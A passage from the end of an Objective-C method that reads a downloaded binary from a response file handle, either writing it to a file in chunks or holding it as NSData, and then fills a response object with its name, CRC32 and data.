			[binaryFileHandle writeData:bytes];
			[binaryFileHandle synchronizeFile]; // Flus data to file
			bytes = nil;
			[pool release];
			
			if (size == 0) {
				break;
			}
		}
		[binaryFileHandle closeFile];
	} else {
		// set binary as NSData
		DLog (@"set binary as NSData")
		binary = [aResponseFileHandle readDataOfLength:binarySize];
	}
	
	[response setMBinaryName:binaryName];
	[response setMCRC32:crc32];
	[response setMBinary:binary];
	
	[binaryName release];
	
	return ([response autorelease]);
}

@end
